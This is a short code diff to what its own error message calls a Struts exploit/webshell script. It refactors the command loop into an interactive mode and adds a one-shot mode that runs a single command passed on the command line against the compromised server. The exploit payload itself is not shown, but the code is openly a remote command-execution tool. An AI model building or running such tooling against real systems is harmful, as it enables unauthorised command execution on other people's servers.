@@ -38,7 +38,7 @@ def setup():
     sys.stderr.write("The struts exploit/webshell failed :-(\n")
     sys.exit(1)
 
-def main():
+def interactive():
     setup()
     while True:
         try:
@@ -48,5 +48,12 @@ def main():
             return
         print(run_command(cmd))
 
+def one_shot(command):
+    setup()
+    print(run_command(command))
+
 if __name__ == "__main__":
-    main()
+    if sys.argv[1:]:
+        one_shot(' '.join(sys.argv[1:]))
+    else:
+        interactive()
